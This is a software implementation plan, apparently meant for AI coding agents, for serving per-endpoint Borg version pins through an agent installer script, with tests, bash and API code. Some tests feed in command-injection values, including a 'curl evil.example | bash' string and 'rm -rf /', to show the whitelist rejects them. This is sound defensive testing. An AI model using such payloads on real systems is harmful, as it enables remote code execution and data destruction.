# Agent upgrades phase 5: per-endpoint Borg version

> **For agentic workers:** REQUIRED SUB-SKILL: Use
> `superpowers:executing-plans` to implement this plan task-by-task. Steps use
> checkbox (`- [x]`) syntax for tracking. The owner has ruled out subagents on
> cost, so `superpowers:subagent-driven-development` is not an option here.

**Goal:** An operator moves one endpoint from Borg 1 to Borg 2 in the Managed
Agents pin dialog, presses Upgrade, and the endpoint comes back running the
Borg major version they chose.

**Architecture:** Everything that records the choice already exists.
`AgentMachine.desired_borg_version` (phase 1), the `PUT
.../desired-version` route that validates and stores it (phase 1), and the
Borg select in `AgentPinControl` (phase 3) all ship today, and today the
value is inert: nothing reads it. This phase connects it at the two ends. On
the server, `/agent/install.sh` starts honouring the `agent_id` query
parameter the phase 2 upgrade helper has been sending all along, so the script
served to one endpoint carries that endpoint's pins; the script gains one
function that lets a served pin beat both the `--borg-version` the helper
passes from `upgrade.conf` and reinstall mode's skip-by-default, and
`write_upgrade_conf` then records the new mode so it sticks. Because a Borg
only change does not move `agent_version`, the reconciler that owns the
upgrade outcome learns to wait for the pinned major to appear in the reported
`borg_versions` before it clears the row. On the page, a small chip next to
the agent version chips says whether the pinned major has landed yet.

**Tech Stack:** FastAPI, SQLAlchemy, pytest, bash (the served installer and
its helper are tested by running them), React, TypeScript, MUI, i18next,
Vitest, Storybook.

**Spec:** `docs/engineering/specs/2026-09-07-centralized-agent-upgrades.md`
(sections 4, 5, 6, 7.1, 9, 10, 11.2, 12; phase 13.6)

## Global Constraints

- No em dashes in UI copy, i18n strings, code comments, docs, or commit
  messages. Check added lines only, with
  `git diff -U0 origin/main | grep -nP '\xe2\x80\x94'`.
- Every new i18n key must be added to all four locales:
  `frontend/src/locales/en.json`, `de.json`, `es.json`, `it.json`. The
  `frontend-locale-check` pre-push hook fails otherwise.
- No heavy left accent borders on cards, panels, alerts, or status surfaces
  (`AGENTS.md`, UI Preferences).
- New UI components go in `frontend/src/pages/managed-agents/`, not inline in
  `ManagedAgents.tsx`, which is over 2400 lines.
- New or changed UI ships a Storybook story for the changed state, in default
  and mobile viewports, matching `ManagedAgents.stories.tsx` conventions.
- Do not register `managed-machines` routes in `ENDPOINT_POLICIES`
  (`app/core/authorization.py`); that router authorizes through its route
  signatures (spec section 11.2).
- The rendered pinning block is executed as root on the endpoint. Every value
  interpolated into it comes from the database now rather than from a wheel
  filename, so each one is whitelisted at render time and dropped when it does
  not match. This is Task 1 and it is not optional (spec section 11.2: a
  compromised agent must not be able to influence what gets installed; a
  hand-edited or legacy database row must not either).
- The four artifacts, the helper's transport rules, and the `.path` trigger are
  phase 2 work and are not touched. This phase changes what the served script
  installs, never how the helper fetches or verifies it.
- Do not re-open a decision in the spec's Appendix B.

## Decisions this plan makes that the spec leaves open

Called out here rather than buried in a task, and repeated as Open questions
at the end for the phase gate.

1. **`desired_agent_version` is written through in the same change as
   `desired_borg_version`.** Phase 13.6 names only the Borg version, but
   spec section 6 says the server resolves *both* from the endpoint's stored
   pins, and Task 1 is the one place per-agent rendering gets added. Rendering
   per agent and then deliberately ignoring the agent pin sitting right next to
   the Borg pin would leave the feature half-wired for no gain. Today the
   agent pin is almost always inert anyway, because the `PUT` route rejects a
   pin the server cannot serve, so `desired ?? available` is normally
   `available`; the case it does change is the stale pin an endpoint carries
   across a server upgrade, which `AgentPinControl` already renders and warns
   about.
2. **The reconciler compares the live `desired_borg_version`, not a snapshot
   column.** Adding `upgrade_target_borg_version` would need a migration to
   record something the operator can only change by opening the pin dialog
   again, and changing the pin mid-flight is a new intent, not a stale one.
   Cost: an operator who changes the pin while an upgrade is in flight has the
   in-flight upgrade judged against the new pin. It resolves on the next
   upgrade, and the row says what it is waiting for throughout.
3. **A served Borg pin beats `--skip-borg-install`.** The helper passes
   `--skip-borg-install` for an endpoint whose recorded `BORG_INSTALL_MODE` is
   `skip`, and a bare `--reinstall` skips Borg by default. A pin is an explicit
   choice an operator made in the UI for this endpoint, so it outranks both, or
   an endpoint installed with `--skip-borg-install` could never be moved from
   the UI at all.
4. **A pin to Borg 2 on an endpoint recorded as `BORG_SOURCE=distro` falls
   back to the server's static binaries.** No distribution ships Borg 2 and
   `install_borg2` exits when the source is `distro`, so honouring the recorded
   source would fail the whole reinstall and leave the endpoint on its old
   agent as well. The fallback is announced in the installer output.
5. **`/agent/install.sh?agent_id=...` stays unauthenticated.** It is the
   public install endpoint and the helper has been sending `agent_id` since
   phase 2. What the parameter now exposes to an unauthenticated caller who
   already knows an `agent_id` is that endpoint's pinned version numbers. An
   `agent_id` is the endpoint's own identifier, the response was already a
   full installer script, and adding auth here would break first-time
   enrollment, which has no credentials yet. An unknown or malformed
   `agent_id` renders the unpinned script rather than 404, so the endpoint
   cannot be probed for which ids exist.
6. **The Borg chip is its own component, not a mode of `AgentUpgradeChip`.**
   Spec section 9 says the comparison reuses the chip component; the shared
   part is `agentChipSx` and the MUI `Chip` conventions, which
   `AgentBorgVersionChip` uses. `AgentUpgradeChip`'s five statuses and its
   tooltip copy are all about the agent wheel, and threading a second
   vocabulary through it would make both harder to read.
7. **The chip renders nothing when there is no Borg pin.** Every endpoint
   would otherwise carry a chip stating the unremarkable, and the card already
   lists the reported Borg binaries in its stats row.

## File Structure

**Created**

| File | Responsibility |
| --- | --- |
| `frontend/src/pages/managed-agents/AgentBorgVersionChip.tsx` | The chip: pinned Borg major landed, or still pending. Renders `null` without a pin. |
| `frontend/src/pages/managed-agents/AgentBorgVersionChip.stories.tsx` | Its stories, default and mobile. |
| `frontend/src/pages/managed-agents/__tests__/AgentBorgVersionChip.test.tsx` | Its tests. |
| `tests/unit/test_agent_installer_pins.py` | Per-agent rendering: which pins reach the script, and which values are refused. |
| `tests/unit/test_agent_installer_borg_override.py` | The `apply_pinned_borg_version` function, extracted from the served script and run under bash. |

**Modified**

| File | Change |
| --- | --- |
| `app/api/agent_installer.py` | `INSTALLER_SCRIPT`: `PINNED_DESIRED_BORG_VERSION` in the pinning block and the `apply_pinned_borg_version` function called after the reinstall defaults. `InstallerPins` and `installer_pins_for_agent`; `render_installer_script(pins)`; both served routes resolve pins from an optional `agent_id`. |
| `app/api/agents.py` | `resolve_agent_upgrade` waits for the pinned Borg major before clearing. |
| `frontend/src/pages/ManagedAgents.tsx` | Render `AgentBorgVersionChip` in the card's chip row. |
| `frontend/src/locales/{en,de,es,it}.json` | The chip's keys; `pinControl.borgHint` loses "applied by a later release". |
| `tests/unit/test_agent_installer_api.py` | The three `render_installer_script()` calls take the new argument. |
| `tests/unit/test_agent_upgrade_reconciliation.py` | The Borg pin cases. |
| `frontend/src/pages/__tests__/ManagedAgents.test.tsx` | The chip appears on a pinned endpoint whose major is missing. |
| `frontend/src/pages/managed-agents/__tests__/AgentPinControl.test.tsx` | The changed hint copy, if asserted there. |
| `docs/managed-agents.md` | What a Borg pin does and when it takes effect. |
| `docs/engineering/specs/2026-09-07-centralized-agent-upgrades.md` | Phase 4 to `done` (Task 6, bookkeeping owed from the merged PR #997), then phase 5 through its states. |

---

## Task 1: The server serves one endpoint its own pins

The upgrade helper phase 2 installed already fetches
`${SERVER}/agent/install.sh?agent_id=${AGENT_ID}` and
`.../install.sh.sha256?agent_id=${AGENT_ID}`
(`app/api/agent_installer.py:921`). Both routes ignore the parameter today, so
`render_installer_script` pins the served wheel and the server's own Borg
versions for everyone. This task makes the pins per endpoint. It changes no
shell logic: `PINNED_DESIRED_BORG_VERSION` is added to the block and is not
read by anything until Task 2.

**Files:**
- Modify: `app/api/agent_installer.py` (pinning block at `:30-40`,
  `render_installer_script` at `:1086`, `get_agent_installer` at `:1114`,
  `get_agent_installer_checksum` at `:1123`)
- Create: `tests/unit/test_agent_installer_pins.py`
- Modify: `tests/unit/test_agent_installer_api.py` (the three
  `render_installer_script()` call sites at `:421`, `:442`, `:459`)

**Interfaces:**
- Consumes: `AgentMachine.desired_agent_version`, `.desired_borg_version`
  (phase 1 columns, `app/database/models.py:121-122`);
  `agent_package_version()`.
- Produces: `InstallerPins(agent_version: str | None,
  desired_borg_version: str | None)`;
  `installer_pins_for_agent(db: Session, agent_id: str | None) ->
  InstallerPins`; `render_installer_script(pins: InstallerPins | None = None)
  -> str`. Task 2 relies on the served script carrying
  `PINNED_DESIRED_BORG_VERSION="<1|2|>"`.

- [x] **Step 1: Write the failing tests**

Create `tests/unit/test_agent_installer_pins.py`:

```python
"""The script served to one endpoint carries that endpoint's pins.

Every value here is interpolated into a block that runs as root on the
endpoint, so the refusals matter as much as the happy path: these values now
come from the database rather than from a wheel filename on this server.
"""

import pytest
from fastapi.testclient import TestClient

from app.api import agent_installer
from app.api.agent_installer import (
    InstallerPins,
    installer_pins_for_agent,
    render_installer_script,
)
from app.core.security import get_password_hash
from app.database.models import AgentMachine


@pytest.fixture
def pinned_agent(test_db):
    def make(agent_id: str, *, agent_version=None, borg_version=None) -> AgentMachine:
        agent = AgentMachine(
            name=agent_id,
            agent_id=agent_id,
            token_hash=get_password_hash("borgui_agent_secret"),
            token_prefix="borgui_agent_secret"[:20],
            status="online",
            desired_agent_version=agent_version,
            desired_borg_version=borg_version,
        )
        test_db.add(agent)
        test_db.commit()
        test_db.refresh(agent)
        return agent

    return make


def test_an_unpinned_endpoint_gets_the_served_wheel(test_db, pinned_agent, monkeypatch):
    """The normal case: no pin means track the server, which is what the
    script pinned for everyone before this phase."""
    monkeypatch.setattr(agent_installer, "agent_package_version", lambda: "0.1.4")
    pinned_agent("agt_plain")

    pins = installer_pins_for_agent(test_db, "agt_plain")
    script = render_installer_script(pins)

    assert pins == InstallerPins(agent_version=None, desired_borg_version=None)
    assert 'PINNED_AGENT_VERSION="0.1.4"' in script
    assert 'PINNED_DESIRED_BORG_VERSION=""' in script


def test_a_pinned_endpoint_gets_its_own_versions(test_db, pinned_agent, monkeypatch):
    monkeypatch.setattr(agent_installer, "agent_package_version", lambda: "0.1.4")
    pinned_agent("agt_pinned", agent_version="0.1.3", borg_version="2")

    script = render_installer_script(installer_pins_for_agent(test_db, "agt_pinned"))

    assert 'PINNED_AGENT_VERSION="0.1.3"' in script
    assert 'PINNED_DESIRED_BORG_VERSION="2"' in script


def test_no_agent_id_renders_the_unpinned_script(test_db, monkeypatch):
    """First-time enrollment has no agent row yet, and the install command
    carries no agent_id."""
    monkeypatch.setattr(agent_installer, "agent_package_version", lambda: "0.1.4")

    assert installer_pins_for_agent(test_db, None) == InstallerPins()


def test_an_unknown_agent_id_renders_the_unpinned_script(test_db):
    """Not a 404. This endpoint is public, so answering differently for a
    known and an unknown id would turn it into a probe for which ids exist."""
    assert installer_pins_for_agent(test_db, "agt_nope") == InstallerPins()


@pytest.mark.parametrize("stored", ["3", "1.2", "", "2; rm -rf /", "both"])
def test_a_borg_version_outside_1_and_2_is_dropped(test_db, pinned_agent, stored):
    """The PUT route validates Literal["1","2"], but the row is what gets
    interpolated into a root-executed script, so the whitelist is applied
    where the interpolation happens."""
    pinned_agent(f"agt_borg_{abs(hash(stored))}", borg_version=stored)
    agent_id = f"agt_borg_{abs(hash(stored))}"

    pins = installer_pins_for_agent(test_db, agent_id)

    assert pins.desired_borg_version is None


@pytest.mark.parametrize(
    "stored",
    ['0.1.3" ; curl evil.example | bash ; #', "0.1.3 --agent-source git", "a" * 65],
)
def test_an_unsafe_agent_version_pin_is_dropped(test_db, pinned_agent, stored, monkeypatch):
    """A pin that cannot be a version cannot reach the script. Dropping it
    falls back to the served wheel, which is the unpinned behaviour."""
    monkeypatch.setattr(agent_installer, "agent_package_version", lambda: "0.1.4")
    pinned_agent("agt_unsafe", agent_version=stored)

    pins = installer_pins_for_agent(test_db, "agt_unsafe")
    script = render_installer_script(pins)

    assert pins.agent_version is None
    assert 'PINNED_AGENT_VERSION="0.1.4"' in script


def test_a_prerelease_pin_is_kept(test_db, pinned_agent):
    """The whitelist is about shell safety, not about version syntax. A wheel
    this server serves can be a prerelease, and app/core/agent_versions.py
    reports such a version as `unknown` rather than refusing it."""
    pinned_agent("agt_rc", agent_version="0.2.0rc1")

    assert installer_pins_for_agent(test_db, "agt_rc").agent_version == "0.2.0rc1"


def test_the_script_and_its_checksum_are_rendered_for_the_same_endpoint(
    test_client: TestClient, test_db, pinned_agent, monkeypatch
):
    """The helper fetches both with the same agent_id and refuses to execute
    on a mismatch, so the two routes must resolve the same pins."""
    import hashlib

    pinned_agent("agt_both", agent_version="0.1.3", borg_version="2")

    script = test_client.get("/agent/install.sh?agent_id=agt_both").text
    published = test_client.get("/agent/install.sh.sha256?agent_id=agt_both").text

    assert 'PINNED_DESIRED_BORG_VERSION="2"' in script
    assert published.strip() == hashlib.sha256(script.encode("utf-8")).hexdigest()


def test_the_unpinned_script_differs_from_a_pinned_one(
    test_client: TestClient, pinned_agent
):
    """Guards the whole point of the task: the parameter is read, not ignored."""
    pinned_agent("agt_two", borg_version="2")

    plain = test_client.get("/agent/install.sh").text
    pinned = test_client.get("/agent/install.sh?agent_id=agt_two").text

    assert 'PINNED_DESIRED_BORG_VERSION=""' in plain
    assert 'PINNED_DESIRED_BORG_VERSION="2"' in pinned
```

- [x] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/unit/test_agent_installer_pins.py -q`
Expected: FAIL at import, `cannot import name 'InstallerPins'`.

- [x] **Step 3: Add the pinned variable to the block**

In `INSTALLER_SCRIPT` (`app/api/agent_installer.py:30`), inside the pinning
block, after `PINNED_AGENT_VERSION=""`:

```bash
# The Borg major version this endpoint is pinned to in the UI, or empty to
# leave whatever is installed alone. Read by apply_pinned_borg_version below.
PINNED_DESIRED_BORG_VERSION=""
```

Extend the block's own comment (`:34-35`) to say the server fills in the Borg
versions it runs, the agent wheel, **and this endpoint's pins**.

- [x] **Step 4: Resolve pins per endpoint**

Add to the imports at the top of `app/api/agent_installer.py`:

```python
from dataclasses import dataclass
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Query, Response
from sqlalchemy.orm import Session

from app.database.database import get_db
from app.database.models import AgentMachine
```

Above `render_installer_script` (`:1086`):

```python
# A pin is interpolated into a block the endpoint executes as root, and it
# arrives from the database rather than from a filename on this server. One
# conservative shape for anything that claims to be a version: no quotes, no
# spaces, no shell metacharacters, and short enough to be a version rather
# than a payload.
_SAFE_PIN = re.compile(r"^[A-Za-z0-9._+-]{1,64}$")


@dataclass(frozen=True)
class InstallerPins:
    """The versions the script served to one endpoint pins.

    `agent_version` of None means track the wheel this server serves.
    `desired_borg_version` of None means leave the installed Borg alone.
    """

    agent_version: Optional[str] = None
    desired_borg_version: Optional[str] = None


def installer_pins_for_agent(
    db: Session, agent_id: Optional[str]
) -> InstallerPins:
    """One endpoint's pins, or the unpinned defaults.

    An unknown agent_id is deliberately not an error. This is the public
    install endpoint: first-time enrollment has no agent row yet, and
    answering differently for a known and an unknown id would make the route
    a probe for which agent ids exist.

    Both values are whitelisted here, at the boundary between the database and
    a root-executed script, rather than trusted from the PUT route that wrote
    them. That route validates, but a row can predate a validation rule or be
    edited by hand, and the cost of the check is a regex.
    """
    if not agent_id:
        return InstallerPins()

    agent = (
        db.query(AgentMachine).filter(AgentMachine.agent_id == agent_id).first()
    )
    if agent is None:
        return InstallerPins()

    agent_version = agent.desired_agent_version
    if agent_version is not None and not _SAFE_PIN.match(agent_version):
        logger.warning(
            "agent_installer_pin_refused",
            agent_id=agent_id,
            field="desired_agent_version",
        )
        agent_version = None

    borg_version = agent.desired_borg_version
    if borg_version not in ("1", "2"):
        if borg_version:
            logger.warning(
                "agent_installer_pin_refused",
                agent_id=agent_id,
                field="desired_borg_version",
            )
        borg_version = None

    return InstallerPins(
        agent_version=agent_version, desired_borg_version=borg_version
    )
```

Change `render_installer_script` to take them:

```python
def render_installer_script(pins: Optional[InstallerPins] = None) -> str:
    """Pin the installer to the versions this server runs and this endpoint
    wants.

    Only the delimited block at the top of the script is rewritten. The rest is
    served verbatim, so the script in the repository stays the script that runs.

    `pins` default to unpinned, which is first-time enrollment and every
    request that names no agent: the served wheel and no Borg override, which
    is what this function pinned for every caller before phase 5.
    """
    pins = pins or InstallerPins()
    versions = {
        "1": _installed_borg_version(BorgInterface, "borg1"),
        "2": _installed_borg_version(Borg2Interface, "borg2"),
    }

    pinning = "\n".join(
        [
            PINNING_BEGIN,
            "# Filled in by the Borg UI instance that served this script.",
            f'PINNED_BORG1_VERSION="{versions["1"] or ""}"',
            f'PINNED_BORG2_VERSION="{versions["2"] or ""}"',
            f'PINNED_BORG_BINARIES="{binary_table(versions)}"',
            f'PINNED_AGENT_VERSION="'
            f'{pins.agent_version or agent_package_version() or ""}"',
            f'PINNED_DESIRED_BORG_VERSION="{pins.desired_borg_version or ""}"',
            PINNING_END,
        ]
    )

    start = INSTALLER_SCRIPT.index(PINNING_BEGIN)
    end = INSTALLER_SCRIPT.index(PINNING_END) + len(PINNING_END)
    return INSTALLER_SCRIPT[:start] + pinning + INSTALLER_SCRIPT[end:]
```

Both routes resolve the pins on the event loop and hand plain strings to the
worker thread:

```python
@router.get("/agent/install.sh")
async def get_agent_installer(
    agent_id: Optional[str] = Query(None),
    db: Session = Depends(get_db),
) -> Response:
    # render_installer_script runs `borg --version` (a blocking subprocess) and
    # touches the filesystem, so it is offloaded to a worker thread rather than run
    # on the event loop of this public endpoint. The pins are resolved before that
    # hand-off: an InstallerPins is plain strings, so no ORM object bound to this
    # request's session is touched from the worker thread.
    pins = installer_pins_for_agent(db, agent_id)
    script = await asyncio.to_thread(render_installer_script, pins)
    return Response(content=script, media_type="text/x-shellscript")


@router.get("/agent/install.sh.sha256")
async def get_agent_installer_checksum(
    agent_id: Optional[str] = Query(None),
    db: Session = Depends(get_db),
) -> Response:
    """The SHA256 of the script this server serves at /agent/install.sh.

    The self-upgrade helper runs the downloaded script as root, so it verifies
    the download against this before executing anything. Rendered through the
    same function as the script itself, for the same endpoint, so the two agree
    for as long as the server's pinned versions and that endpoint's pins do not
    change between the helper's two requests. A server restarted into a new
    release in that window, or a pin changed in it, makes the helper refuse and
    retry later, which is the direction to fail in.
    """
    pins = installer_pins_for_agent(db, agent_id)
    script = await asyncio.to_thread(render_installer_script, pins)
    digest = hashlib.sha256(script.encode("utf-8")).hexdigest()
    return Response(content=f"{digest}\n", media_type="text/plain")
```

- [x] **Step 5: Keep the existing installer tests calling the new signature**

The three `render_installer_script()` calls in
`tests/unit/test_agent_installer_api.py` (`:421`, `:442`, `:459`) still pass:
the argument is optional and defaults to unpinned. Add one assertion to
`test_agent_installer_pins_the_versions_the_server_runs` so the unpinned
default is stated where the other pins are:

```python
    assert 'PINNED_DESIRED_BORG_VERSION=""' in script
```

- [x] **Step 6: Run the tests to verify they pass**

Run: `pytest tests/unit/test_agent_installer_pins.py tests/unit/test_agent_installer_api.py tests/unit/test_agent_upgrade_helper.py -q`
Expected: PASS. The helper tests are in the list because they fetch
`/agent/install.sh` through the test client and would catch a route signature
that broke the unparameterised call.

---

## Task 2: The served pin beats the recorded install mode

Task 1 puts `PINNED_DESIRED_BORG_VERSION` in the script and nothing reads it.
This task makes it decide what gets installed, and makes the choice stick: once
`BORG_VERSION_SET` is `1` and `SKIP_BORG_INSTALL` is `0`,
`write_upgrade_conf` (`:799`) already records `BORG_INSTALL_MODE="${BORG_VERSION}"`,
so the endpoint's own record follows the pin and later upgrades keep it even if
the pin is cleared afterwards.

The precedence is the whole task. The helper runs
`install.sh --reinstall --service-user ... --borg-version "${BORG_INSTALL_MODE}"`
(or `--skip-borg-install`), all from `upgrade.conf`, which records how the
endpoint was installed. A pin is what an operator has since asked for, so it
outranks both, and a bare `--reinstall` sets `SKIP_BORG_INSTALL=1` by default
(`:242-245`), which it must also outrank.

**Files:**
- Modify: `app/api/agent_installer.py` (`INSTALLER_SCRIPT`: new function and
  its call site, after the reinstall block that ends at `:262`)
- Create: `tests/unit/test_agent_installer_borg_override.py`

**Interfaces:**
- Consumes: `PINNED_DESIRED_BORG_VERSION` from Task 1.
- Produces: the shell function `apply_pinned_borg_version`, which sets
  `BORG_VERSION`, `BORG_VERSION_SET`, `SKIP_BORG_INSTALL` and possibly
  `BORG_SOURCE`. Nothing else calls it.

- [x] **Step 1: Write the failing tests**

Create `tests/unit/test_agent_installer_borg_override.py`. The function is
extracted from the served script and run under bash, the same technique
`tests/unit/test_agent_upgrade_helper.py` uses for the helper: this is shell
that decides what gets installed as root, so it is executed rather than read.

```python
"""The pinned Borg version has to beat how the endpoint was installed.

The upgrade helper passes --borg-version (or --skip-borg-install) from
upgrade.conf, which records the install, and a bare --reinstall skips Borg by
default. A pin is what an operator asked for afterwards, so it outranks both.
The function is extracted from the served script and run, not read.
"""

import subprocess
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.api import agent_installer

FUNCTION_NAME = "apply_pinned_borg_version"


def extract_function(script: str, name: str) -> str:
    """The function body, from its opening line to the closing brace in
    column 0. Bash has no other way to say where a function ends, and the
    installer writes every function this way."""
    begin = script.index(f"{name}() {{")
    end = script.index("\n}\n", begin) + len("\n}\n")
    body = script[begin:end]
    assert body.rstrip().endswith("}"), body[-80:]
    return body


def run_override(
    tmp_path: Path,
    *,
    pinned: str,
    borg_version: str = "1",
    borg_version_set: str = "0",
    skip_borg_install: str = "0",
    borg_source: str = "server",
) -> dict[str, str]:
    """Run the function with the variables the installer would hold, and
    report what it left them as."""
    body = extract_function(agent_installer.render_installer_script(), FUNCTION_NAME)
    harness = tmp_path / "harness.sh"
    harness.write_text(
        "\n".join(
            [
                "set -euo pipefail",
                f'PINNED_DESIRED_BORG_VERSION="{pinned}"',
                f'BORG_VERSION="{borg_version}"',
                f'BORG_VERSION_SET="{borg_version_set}"',
                f'SKIP_BORG_INSTALL="{skip_borg_install}"',
                f'BORG_SOURCE="{borg_source}"',
                body,
                FUNCTION_NAME,
                'echo "RESULT BORG_VERSION=${BORG_VERSION}"',
                'echo "RESULT BORG_VERSION_SET=${BORG_VERSION_SET}"',
                'echo "RESULT SKIP_BORG_INSTALL=${SKIP_BORG_INSTALL}"',
                'echo "RESULT BORG_SOURCE=${BORG_SOURCE}"',
                "",
            ]
        ),
        encoding="utf-8",
    )

    completed = subprocess.run(
        ["bash", str(harness)], capture_output=True, text=True, timeout=30
    )
    assert completed.returncode == 0, completed.stderr
    return dict(
        line.removeprefix("RESULT ").split("=", 1)
        for line in completed.stdout.splitlines()
        if line.startswith("RESULT ")
    )


def test_no_pin_leaves_every_choice_alone(tmp_path):
    """The unpinned case is every first-time install and every endpoint
    without a pin, so it must not change behaviour at all."""
    result = run_override(
        tmp_path, pinned="", borg_version="1", skip_borg_install="1"
    )

    assert result["BORG_VERSION"] == "1"
    assert result["BORG_VERSION_SET"] == "0"
    assert result["SKIP_BORG_INSTALL"] == "1"


def test_a_pin_overrides_the_borg_version_the_helper_passed(tmp_path):
    """The helper passes --borg-version 1 from upgrade.conf; the operator
    pinned 2."""
    result = run_override(
        tmp_path, pinned="2", borg_version="1", borg_version_set="1"
    )

    assert result["BORG_VERSION"] == "2"
    assert result["BORG_VERSION_SET"] == "1"
    assert result["SKIP_BORG_INSTALL"] == "0"


def test_a_pin_overrides_skip_borg_install(tmp_path):
    """An endpoint recorded as BORG_INSTALL_MODE=skip, and a bare --reinstall,
    both arrive here with SKIP_BORG_INSTALL=1. A pin has to win or such an
    endpoint could never be moved from the UI."""
    result = run_override(tmp_path, pinned="2", skip_borg_install="1")

    assert result["BORG_VERSION"] == "2"
    assert result["SKIP_BORG_INSTALL"] == "0"


def test_pinning_borg_2_on_a_distro_endpoint_falls_back_to_server_binaries(
    tmp_path,
):
    """No distribution ships Borg 2 and install_borg2 exits on distro, which
    would fail the whole reinstall and lose the agent upgrade with it."""
    result = run_override(tmp_path, pinned="2", borg_source="distro")

    assert result["BORG_VERSION"] == "2"
    assert result["BORG_SOURCE"] == "server"


def test_pinning_borg_1_leaves_a_distro_endpoint_on_distro(tmp_path):
    """Distributions do ship Borg 1, so an endpoint installed from packages
    must not be repointed at the server's binaries by a pin it already
    satisfies."""
    result = run_override(tmp_path, pinned="1", borg_source="distro")

    assert result["BORG_VERSION"] == "1"
    assert result["BORG_SOURCE"] == "distro"


@pytest.mark.parametrize("pinned", ["3", "both", "1.2"])
def test_an_unusable_pin_changes_nothing(tmp_path, pinned):
    """The server drops these before they are served (Task 1). The script
    still refuses them: it is also runnable straight from the repository, and
    a pin it cannot map to install_borg1 or install_borg2 must not silently
    become one of them."""
    result = run_override(
        tmp_path, pinned=pinned, borg_version="1", skip_borg_install="1"
    )

    assert result["BORG_VERSION"] == "1"
    assert result["SKIP_BORG_INSTALL"] == "1"


def test_the_override_runs_after_the_reinstall_defaults_and_before_the_install(
    test_client: TestClient,
):
    """Placement is the property under test. Called before the reinstall block
    it would be undone by the skip-by-default; called after the install case
    or after write_upgrade_conf it would decide nothing."""
    script = test_client.get("/agent/install.sh").text
    call_site = script.index(f"\n{FUNCTION_NAME}\n")

    assert call_site > script.index("Skipping Borg installation by default")
    assert call_site < script.index('case "${BORG_VERSION}" in')
    assert call_site < script.index("write_upgrade_conf()")
```

- [x] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/unit/test_agent_installer_borg_override.py -q`
Expected: FAIL with `ValueError: substring not found` from
`extract_function`, since the script has no such function yet.

- [x] **Step 3: Add the function and call it**

In `INSTALLER_SCRIPT`, immediately after the `fi` that closes the
reinstall/first-install argument block (`app/api/agent_installer.py:262`) and
before `resolve_user_group_home()`:

```bash
# A server that knows which endpoint is asking resolves that endpoint's pins
# into the block at the top of this script (installer_pins_for_agent in
# app/api/agent_installer.py). The pinned Borg version has to beat two things
# that describe how this endpoint was installed rather than what it should
# run: the --borg-version the upgrade helper passes from upgrade.conf, and
# reinstall mode's skip-by-default above. Without that precedence a Borg
# choice made in the UI could never reach an endpoint.
#
# Setting BORG_VERSION_SET and clearing SKIP_BORG_INSTALL is also what makes
# the choice stick: write_upgrade_conf then records BORG_INSTALL_MODE from
# BORG_VERSION, so this endpoint's own record follows the pin.
apply_pinned_borg_version() {
  if [[ -z "${PINNED_DESIRED_BORG_VERSION}" ]]; then
    return 0
  fi

  # The server drops anything but 1 or 2 before serving it. Repeated here
  # because this script is also runnable straight from the repository, and a
  # value that reaches the case below unmatched would skip Borg silently.
  case "${PINNED_DESIRED_BORG_VERSION}" in
    1 | 2) ;;
    *)
      echo "Ignoring unusable pinned Borg version" \
        "'${PINNED_DESIRED_BORG_VERSION}'." >&2
      return 0
      ;;
  esac

  BORG_VERSION="${PINNED_DESIRED_BORG_VERSION}"
  BORG_VERSION_SET="1"
  SKIP_BORG_INSTALL="0"

  if [[ "${BORG_VERSION}" == "2" && "${BORG_SOURCE}" == "distro" ]]; then
    # install_borg2 exits when the source is distro, which would fail this
    # whole reinstall and lose the agent upgrade with it. The pin is explicit,
    # so prefer the server's static binaries over refusing.
    BORG_SOURCE="server"
    echo "No distribution ships Borg 2, so the pinned Borg 2 comes from the" \
      "server's binaries."
  fi

  echo "This endpoint is pinned to Borg ${BORG_VERSION}."
}

apply_pinned_borg_version
```

- [x] **Step 4: Run the tests to verify they pass**

Run: `pytest tests/unit/test_agent_installer_borg_override.py tests/unit/test_agent_installer_pins.py tests/unit/test_agent_installer_api.py tests/unit/test_agent_upgrade_helper.py -q`
Expected: PASS.

---

## Task 3: The outcome waits for the pinned Borg major

Spec section 7.1 gives the server the outcome, and it recognises success as
"the endpoint came back reporting `agent_version == upgrade_target_version`".
A Borg only change does not move `agent_version`, so today such an upgrade is
resolved the instant the endpoint's next heartbeat arrives, before the
reinstall has done anything, and an upgrade that fails to change Borg reports
as a success. The predicate gains the second half of the target.

**Two things are wrong in `resolve_agent_upgrade`'s current call sites** and
both are fixed here. It is called at `app/api/agents.py:1391` (heartbeat) and
`:1460` (hello) immediately after `agent_version` is assigned, but
`borg_versions` is not assigned until `:1395` and `:1464`. Reading the pin
against the previous heartbeat's binaries would resolve an upgrade one
heartbeat late at best, and on the register path would read binaries from
before the reinstall. The call moves below the `borg_versions` assignment in
both paths.

**Files:**
- Modify: `app/core/agent_versions.py` (new predicate)
- Modify: `app/api/agents.py` (`resolve_agent_upgrade` at `:142`; its call
  sites at `:1391` and `:1460`)
- Modify: `tests/unit/test_agent_upgrade_reconciliation.py`

**Interfaces:**
- Consumes: `AgentMachine.desired_borg_version`, `.borg_versions` (the
  reported list of `{"major": int, "version": str, "path": str,
  "install_source": str}` payloads, `agent/borg_ui_agent/borg.py:19`).
- Produces: `borg_pin_satisfied(*, desired: str | None, reported:
  list[dict] | None) -> bool` in `app/core/agent_versions.py`. Task 4 uses the
  same rule in TypeScript, deliberately duplicated rather than shared, and
  says so.

- [x] **Step 1: Write the failing tests**

Append to `tests/unit/test_agent_upgrade_reconciliation.py`. Extend the
existing `_requested` helper with the two new fields rather than adding a
second builder:

```python
def _requested(
    test_db, *, reported, requested_at, desired_borg=None, borg_versions=None
):
    agent = AgentMachine(
        name="endpoint",
        agent_id="agt_recon",
        token_hash=get_password_hash("borgui_agent_secret"),
        token_prefix="borgui_agent_secret"[:20],
        status="online",
        agent_version=reported,
        desired_borg_version=desired_borg,
        borg_versions=borg_versions,
        upgrade_state="requested",
        upgrade_requested_at=requested_at,
        upgrade_target_version="0.1.3",
    )
    test_db.add(agent)
    test_db.commit()
    test_db.refresh(agent)
    return agent
```

New tests:

```python
def test_an_unsatisfied_borg_pin_leaves_it_requested(test_db):
    """A Borg only change does not move agent_version, so without this the
    upgrade resolves on the next heartbeat and an operator is told the Borg
    move succeeded before the reinstall has run."""
    agent = _requested(
        test_db,
        reported="0.1.3",
        requested_at=datetime.now(timezone.utc),
        desired_borg="2",
        borg_versions=[{"major": 1, "version": "1.4.0", "path": "/usr/local/bin/borg"}],
    )

    resolve_agent_upgrade(agent)

    assert agent.upgrade_state == "requested"


